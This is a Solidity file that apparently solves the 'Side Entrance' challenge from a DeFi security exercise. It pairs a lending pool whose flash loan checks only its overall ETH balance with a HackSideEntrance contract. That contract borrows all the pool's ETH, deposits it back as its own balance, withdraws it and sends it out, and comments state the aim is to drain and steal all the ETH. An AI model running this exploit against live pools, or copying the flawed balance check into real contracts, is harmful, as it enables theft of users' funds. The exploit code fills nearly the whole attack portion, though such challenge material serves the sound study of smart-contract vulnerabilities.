pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.sendValue(amountToWithdraw);
    }

    /**+-In order to Drain and Steal ALL the ETH from this S.C., we get a FlashLoan for all
    the ETH stored in this S.C., then we Re-Deposit it the S.C. again and then we IMMEDIATELY
    call "withdraw()".*/
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
    }
}

contract HackSideEntrance {
    SideEntranceLenderPool public pool;

    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
    }

    fallback() external payable {}

    function attack() external {
        pool.flashLoan(address(pool).balance);
        /**+-The Function "execute()" in our S.C. is going to be called by the FlashLoan
        and it will IMMEDIATELY Re-Deposit all the ETH that we just borrowed.*/
        pool.withdraw();
        msg.sender.transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}